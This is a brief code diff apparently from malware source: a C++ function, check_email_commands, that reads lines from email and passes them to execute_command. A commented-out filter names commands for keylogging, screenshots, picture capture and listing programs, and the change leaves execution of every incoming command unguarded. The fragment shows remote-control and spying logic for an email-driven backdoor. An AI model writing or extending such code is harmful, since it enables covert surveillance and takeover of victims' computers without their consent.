@@ -104,9 +104,8 @@ void check_email_commands() {
       //     line.find("list_program") != string::npos ||
       //     line.find("get_picture") != string::npos ||
       //     line.find("get_screenshot") != string::npos ||
-      //     line.find("keylogger") != string::npos) 
-        execute_command(line);
-      
+      //     line.find("keylogger") != string::npos)
+      execute_command(line);
     }
   }
 
